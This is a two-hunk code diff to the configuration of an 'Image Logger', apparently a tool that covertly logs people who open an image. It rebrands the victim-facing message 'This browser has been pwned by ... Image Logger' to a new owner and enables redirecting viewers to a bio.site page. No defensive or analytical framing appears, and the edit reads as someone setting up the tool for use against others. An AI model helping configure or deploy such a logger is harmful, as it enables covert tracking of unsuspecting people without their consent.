@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
+        "message": "This browser has been pwned by Alisa's Image Logger. https://github.com/OverPowerC", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -50,7 +50,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
+        "redirect": True, # Redirect to a webpage?
         "page": "https://bio.site/AlisaKujou" # Link to the webpage to redirect to 
     },
 
